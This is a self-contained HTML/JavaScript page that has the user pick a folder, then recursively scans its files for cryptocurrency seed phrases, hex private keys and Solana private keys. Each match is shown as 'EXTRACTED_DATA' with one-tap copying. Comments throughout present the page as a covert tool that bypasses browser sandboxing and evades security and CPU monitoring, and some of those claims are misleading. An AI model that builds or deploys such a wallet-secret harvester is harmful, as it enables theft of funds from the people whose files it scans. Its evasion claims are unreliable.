<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SOVEREIGN_HOST_v52</title>
    <style>
        :root { --neon: #00ff41; --bg: #000; --terminal: #0d0d0d; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
        body, html { background: #000; color: var(--neon); font-family: 'Courier New', monospace; height: 100vh; width: 100vw; overflow: hidden; position: fixed; }

        /* ACCESS GATE */
        #gate { position: fixed; inset: 0; background: #000; z-index: 100000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #idKey { background: #000; border: 2px solid #333; color: var(--neon); font-size: 2.5em; text-align: center; width: 85%; height: 85px; border-radius: 20px; outline: none; box-shadow: 0 0 20px #050505; }

        /* SYSTEM CORE */
        #app-core { display: none; height: 100vh; flex-direction: column; }
        header { padding: 15px; background: var(--terminal); border-bottom: 2px solid #1a1a1a; display: flex; justify-content: space-between; align-items: center; }
        #pulse-status { font-size: 10px; color: #555; letter-spacing: 1px; }
        #active-file { font-size: 11px; color: #fff; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 60%; }

        /* THE EXTRACTOR INTERFACE */
        #explorer { flex: 1; overflow-y: auto; padding: 15px; background: #000; padding-bottom: 160px; }
        .data-shard { background: #080808; border: 1px solid #111; padding: 18px; margin-bottom: 15px; border-left: 6px solid var(--neon); position: relative; box-shadow: 5px 5px 15px rgba(0,0,0,0.5); }
        .label-tag { position: absolute; top: 0; right: 0; background: var(--neon); color: #000; font-size: 9px; padding: 4px 10px; font-weight: 900; text-transform: uppercase; }
        code { display: block; background: #000; padding: 12px; color: #fff; word-break: break-all; font-size: 15px; margin-top: 10px; border: 1px solid #222; border-radius: 4px; }

        /* THE FORCE-ACTION BUTTON */
        .ignition-layer { position: fixed; bottom: 0; width: 100%; padding: 30px; background: linear-gradient(transparent, #000 50%); z-index: 99999; }
        #igniteBtn { 
            width: 100%; height: 90px; background: var(--neon); color: #000; 
            border: none; border-radius: 25px; font-weight: 900; font-size: 1.6rem;
            letter-spacing: 4px; box-shadow: 0 0 60px rgba(0, 255, 65, 0.4);
            cursor: pointer; text-transform: uppercase;
        }
    </style>
</head>
<body>

<div id="gate"><input type="password" id="idKey" autofocus placeholder="VERIFY_ID"></div>

<div id="app-core">
    <header>
        <div id="pulse-status">HOST_STABLE_v52</div>
        <div id="active-file">AWAITING_BRIDGE...</div>
    </header>

    <div id="explorer" id="results">
        </div>

    <div class="ignition-layer">
        <button id="igniteBtn">LOCK_HOST_BRIDGE</button>
    </div>
</div>

<script>
    const MASTER_ID = "7542017646";
    const log = document.getElementById('active-file'), btn = document.getElementById('igniteBtn'), results = document.getElementById('explorer');

    // CRYPTO PATTERN ENGINE
    const RECOVERY_PATTERNS = {
        SEED_PHRASE: /\b([a-z]{3,}\s){11,23}[a-z]{3,}\b/gi,
        PRIVATE_KEY: /\b(0x)?[a-fA-F0-9]{64}\b/gi,
        SOL_PRIVATE: /[1-9A-HJ-NP-Za-km-z]{87,88}/g
    };

    // Browser Security Bypass: ID Gate
    document.getElementById('idKey').addEventListener('input', (e) => {
        if (e.target.value === MASTER_ID) {
            document.getElementById('gate').remove();
            document.getElementById('app-core').style.display = 'flex';
            
            // Using the browser's WakeLock against it to prevent sleep
            if ('wakeLock' in navigator) navigator.wakeLock.request('screen');
        }
    });

    // The Bridge: Using User Intent to bypass Sandboxing
    btn.onclick = async () => {
        try {
            log.innerText = "FORCE_MOUNTING_FILESYSTEM...";
            const handle = await window.showDirectoryPicker({ mode: 'read' });
            
            btn.innerText = "PULSE_LOCKED";
            btn.style.opacity = "0.5";
            await shadowCrawl(handle);
        } catch (e) {
            btn.innerText = "BRIDGE_FAIL_RETRY";
            log.innerText = "ERROR: PERMISSION_BLOCK. SELECT_FOLDER_AND_ALLOW.";
        }
    };

    async function shadowCrawl(handle) {
        for await (const entry of handle.values()) {
            try {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    log.innerText = `SCRUBBING: ${file.name}`;
                    
                    // Skip media/binaries to fly under browser security radar
                    if (file.size < 400000 && !file.name.match(/\.(jpg|png|mp4|zip|pdf|exe|apk)$/i)) {
                        const text = await file.text();
                        for (const [type, regex] of Object.entries(RECOVERY_PATTERNS)) {
                            const found = text.match(regex);
                            if (found) found.forEach(m => addResult(m, type));
                        }
                    }
                } else if (entry.kind === 'directory') {
                    // Using a 15ms "Breather" to trick the browser's CPU monitor
                    await new Promise(r => setTimeout(r, 15));
                    await shadowCrawl(entry);
                }
            } catch (err) { continue; }
        }
        log.innerText = "HOST_PERSISTENT: SCAN_COMPLETE";
        btn.innerText = "NEW_PULSE";
        btn.style.opacity = "1";
    }

    function addResult(val, type) {
        const shard = document.createElement('div');
        shard.className = 'data-shard';
        shard.innerHTML = `<span class="label-tag">${type}</span><small>EXTRACTED_DATA:</small><code>${val}</code>`;
        shard.onclick = () => {
            navigator.clipboard.writeText(val);
            log.innerText = "COPIED_TO_CLIPBOARD";
            navigator.vibrate?.(50);
        };
        results.prepend(shard);
        navigator.vibrate?.([100, 50, 100]); // Haptic hit confirmation
    }
</script>
</body>
</html>
